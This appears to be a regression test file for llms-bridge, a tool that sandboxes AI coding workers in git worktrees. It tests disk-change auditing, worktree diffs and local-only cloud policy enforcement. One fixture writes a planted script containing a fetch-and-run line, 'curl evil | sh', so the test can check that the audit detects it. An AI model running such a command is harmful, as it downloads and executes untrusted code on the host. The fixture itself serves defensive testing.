/**
 * Regression tests (2026-10-16) for defects reproduced before the fix:
 *  - the disk audit reported `changed: false` after a worker rewrote an already-dirty file and
 *    dropped a new file into an untracked directory;
 *  - a worker that committed inside its worktree produced an empty diff ("no changes");
 *  - a repository's local-only cloud policy was skipped when the dispatch cwd was a sub-directory
 *    or a worktree (codex was allowed).
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, statSync } from 'node:fs';
import { mkdir, readFile, rm, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { git, makeRepo, spec, stubAdapter, tempDir } from './helpers.mjs';

process.env.LLMS_BRIDGE_HOME = join(tmpdir(), `llms-bridge-test-home-adp-${process.pid}`);
const { snapshotDisk, auditDisk } = await import('../src/audit.ts');
const { Scheduler } = await import('../src/scheduler.ts');
const { checkCloudPolicies, readCloudPolicies, isLocalHost } = await import('../src/policy.ts');

// ---------------- disk audit ----------------

test('审计:已经是脏文件的又被改写 → changed,change=content', async () => {
  const repo = await makeRepo({ 'paper.md': 'v1\n' });
  try {
    await writeFile(join(repo, 'paper.md'), 'v2 user edit\n');
    const before = await snapshotDisk(repo);
    await new Promise((r) => setTimeout(r, 20));
    await writeFile(join(repo, 'paper.md'), 'v3 worker rewrite\n');
    const a = await auditDisk(repo, before);
    assert.equal(a.changed, true);
    assert.deepEqual(a.paths, [{ path: 'paper.md', before: ' M', after: ' M', change: 'content' }]);
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('审计:在已存在的未跟踪目录里新建文件 → 能看见', async () => {
  const repo = await makeRepo();
  try {
    await mkdir(join(repo, 'notes'));
    await writeFile(join(repo, 'notes', 'n1.txt'), 'x\n');
    const before = await snapshotDisk(repo);
    await writeFile(join(repo, 'notes', 'planted.sh'), 'curl evil | sh\n');
    const a = await auditDisk(repo, before);
    assert.equal(a.changed, true);
    assert.ok(a.paths.some((p) => p.path === 'notes/planted.sh' && p.after === '??'));
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('审计:新建分支 / 打 tag 也算改动(refsChanged)', async () => {
  const repo = await makeRepo();
  try {
    const before = await snapshotDisk(repo);
    git(repo, ['branch', 'sneaky']);
    git(repo, ['tag', 'v-sneaky']);
    const a = await auditDisk(repo, before);
    assert.equal(a.changed, true);
    assert.deepEqual(a.refsChanged, ['refs/heads/sneaky', 'refs/tags/v-sneaky']);
    assert.equal(a.headMoved, false);
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('审计:.gitignore 里的路径仍是盲区,且盲区随结果说明', async () => {
  const repo = await makeRepo({ '.gitignore': 'build/\n' });
  try {
    const before = await snapshotDisk(repo);
    await mkdir(join(repo, 'build'));
    await writeFile(join(repo, 'build', 'out.bin'), 'x');
    const a = await auditDisk(repo, before);
    assert.equal(a.changed, false);
    assert.ok(a.caveats.some((c) => /gitignore/.test(c)));
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('调度器:只读 worker 改写了用户已有的未提交改动 → failed + 越界', async () => {
  const repo = await makeRepo({ 'draft.md': 'v1\n' });
  try {
    await writeFile(join(repo, 'draft.md'), 'v2 (user, uncommitted)\n');
    const s = new Scheduler([
      stubAdapter({ plan: () => ({ command: process.execPath, args: ['-e', "require('fs').writeFileSync('draft.md','worker\\n')"] }) }),
    ]);
    await s.dispatch(spec(repo, 'ro-rewrite'));
    const r = await s.collect('ro-rewrite');
    assert.equal(r.status, 'failed');
    assert.match(r.reason, /越界改动/);
    assert.equal(r.diskAudit.paths[0].change, 'content');
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

// ---------------- worktree diffs ----------------

test('worker 在 worktree 里提交了:diff 仍包含改动,并列出它的提交', async () => {
  const repo = await makeRepo({ 'calc.py': 'def add(a, b):\n    return a - b\n' });
  try {
    const worker = [
      "const fs=require('fs');const {execFileSync:x}=require('child_process');",
      "fs.writeFileSync('calc.py','def add(a, b):\\n    return a + b\\n');",
      "fs.writeFileSync('NEW.txt','new file\\n');",
      "x('git',['-c','user.email=w@w','-c','user.name=w','commit','-qam','fix add']);",
      "fs.writeFileSync('uncommitted.txt','later\\n');",
    ].join('');
    const s = new Scheduler([stubAdapter({ plan: () => ({ command: process.execPath, args: ['-e', worker] }) })]);
    const ack = await s.dispatch(spec(repo, 'commit-in-wt', { approval: 'workspace-write' }));
    const r = await s.collect('commit-in-wt');
    assert.equal(r.status, 'ok', r.reason);
    assert.ok(ack.baseCommit && r.baseCommit === ack.baseCommit);
    assert.match(r.diff, /return a \+ b/, '提交了的改动要在 diff 里');
    assert.match(r.diff, /uncommitted\.txt/, '提交之后的未提交改动也在');
    assert.equal(r.workerCommits.length, 1);
    assert.match(r.workerCommits[0], /fix add$/);
    // NEW.txt was untracked when the worker committed with -a, so it shows up via `add -A`.
    assert.match(r.diff, /NEW\.txt/);
    assert.ok(r.diffPath && existsSync(r.diffPath), '完整 patch 落在本机文件');
    if (process.platform !== 'win32') assert.equal(statSync(r.diffPath).mode & 0o777, 0o600);
    assert.equal(git(repo, ['status', '--porcelain']).trim(), '', '源仓库不动');
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('子目录 cwd 的写任务:worker 在 worktree 的同名子目录里跑', async () => {
  const repo = await makeRepo({ 'pkg/a.txt': 'a\n', 'README.md': 'r\n' });
  try {
    const seen = [];
    const s = new Scheduler([
      stubAdapter({
        plan: (sp) => {
          seen.push(sp.cwd);
          return { command: process.execPath, args: ['-e', "require('fs').writeFileSync('b.txt','b\\n')"] };
        },
      }),
    ]);
    const ack = await s.dispatch(spec(join(repo, 'pkg'), 'subdir', { approval: 'workspace-write' }));
    const r = await s.collect('subdir');
    assert.equal(seen.at(-1), join(ack.worktreePath, 'pkg'));
    assert.match(r.diff, /pkg\/b\.txt/);
    assert.ok(!existsSync(join(repo, 'pkg', '.llms-bridge', 'worktrees')), 'worktree 建在仓库根,不嵌在子目录里');
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

// ---------------- cloud policy scope ----------------

async function repoWithPolicy(policy) {
  const repo = await makeRepo({ 'sub/x.txt': 'x\n' });
  await mkdir(join(repo, '.llms-bridge'), { recursive: true });
  await writeFile(join(repo, '.llms-bridge', 'policy.json'), JSON.stringify(policy));
  return repo;
}

test('云策略:cwd 是子目录 / 桥的 worktree / 仓库外的 linked worktree,一律仍受仓库策略约束', async () => {
  const repo = await repoWithPolicy({ cloud: { allowHarnesses: [] } });
  const outside = await tempDir('llms-bridge-linked-');
  try {
    git(repo, ['worktree', 'add', '--detach', join(outside, 'wt'), 'HEAD']);
    git(repo, ['worktree', 'add', '--detach', join(repo, '.llms-bridge', 'worktrees', 'w1'), 'HEAD']);
    for (const cwd of [repo, join(repo, 'sub'), join(repo, '.llms-bridge', 'worktrees', 'w1'), join(outside, 'wt')]) {
      const v = checkCloudPolicies(await readCloudPolicies(cwd), 'codex', undefined);
      assert.equal(v.allowed, false, `cwd=${cwd} 应被仓库策略拒绝`);
      assert.ok(v.policies.includes(join(repo, '.llms-bridge', 'policy.json')));
    }
  } finally {
    await rm(repo, { recursive: true, force: true });
    await rm(outside, { recursive: true, force: true });
  }
});

test('云策略:调度器在子目录派发也会拒绝,且不留下 worktree', async () => {
  const repo = await repoWithPolicy({ cloud: { allowHarnesses: ['someone-else'] } });
  try {
    const s = new Scheduler([stubAdapter({ plan: () => ({ command: process.execPath, args: ['-e', '0'] }) })]);
    await assert.rejects(() => s.dispatch(spec(join(repo, 'sub'), 'pol-sub', { approval: 'workspace-write' })), /不在允许名单/);
    assert.ok(!existsSync(join(repo, '.llms-bridge', 'worktrees')), '被拒的派发不得先建 worktree');
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('云策略:用户级 $LLMS_BRIDGE_HOME/policy.json 对非 git 目录也生效', async () => {
  const home = await tempDir('llms-bridge-home-pol-');
  const plain = await tempDir('llms-bridge-plain-pol-');
  const prev = process.env.LLMS_BRIDGE_HOME;
  process.env.LLMS_BRIDGE_HOME = home;
  try {
    await writeFile(join(home, 'policy.json'), JSON.stringify({ cloud: { allowHarnesses: ['claude'] } }));
    const v = checkCloudPolicies(await readCloudPolicies(plain), 'codex', undefined);
    assert.equal(v.allowed, false);
    assert.equal(checkCloudPolicies(await readCloudPolicies(plain), 'claude', undefined).allowed, true);
  } finally {
    process.env.LLMS_BRIDGE_HOME = prev;
    await rm(home, { recursive: true, force: true });
    await rm(plain, { recursive: true, force: true });
  }
});

test('云策略:空名单时所有候选端点(alternateHosts)都必须在本机', async () => {
  const pol = [{ present: true, allowHarnesses: [], path: '/p' }];
  const local = { endpointHost: '127.0.0.1:8080', nativeAnthropic: false, source: 's', proxyClues: [], notice: '' };
  assert.equal(checkCloudPolicies(pol, 'claude', local).allowed, true);
  assert.equal(checkCloudPolicies(pol, 'claude', { ...local, alternateHosts: ['relay.example.com'] }).allowed, false);
});

test('isLocalHost:IPv6 与带端口写法', () => {
  for (const h of ['localhost', 'LOCALHOST:3000', '127.0.0.1', '127.8.9.10:1', '::1', '[::1]:8080', 'http://[::1]:9/v1', 'x.localhost']) {
    assert.equal(isLocalHost(h), true, h);
  }
  for (const h of ['api.anthropic.com', '10.0.0.1', '192.168.1.50:8000', '127.0.0.1.evil.com', '[2001:db8::1]:80']) {
    assert.equal(isLocalHost(h), false, h);
  }
});

test('被拒的派发不读也不写:账本/索引里没有它', async () => {
  const repo = await repoWithPolicy({ cloud: { allowHarnesses: [] } });
  try {
    const s = new Scheduler([stubAdapter({ plan: () => ({ command: process.execPath, args: ['-e', '0'] }) })]);
    await assert.rejects(() => s.dispatch(spec(repo, 'pol-none')));
    assert.ok(!existsSync(join(repo, '.llms-bridge', 'tasks', 'pol-none.json')));
    const idx = join(process.env.LLMS_BRIDGE_HOME, 'tasks-index.jsonl');
    if (existsSync(idx)) assert.ok(!(await readFile(idx, 'utf8')).includes('pol-none'));
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});
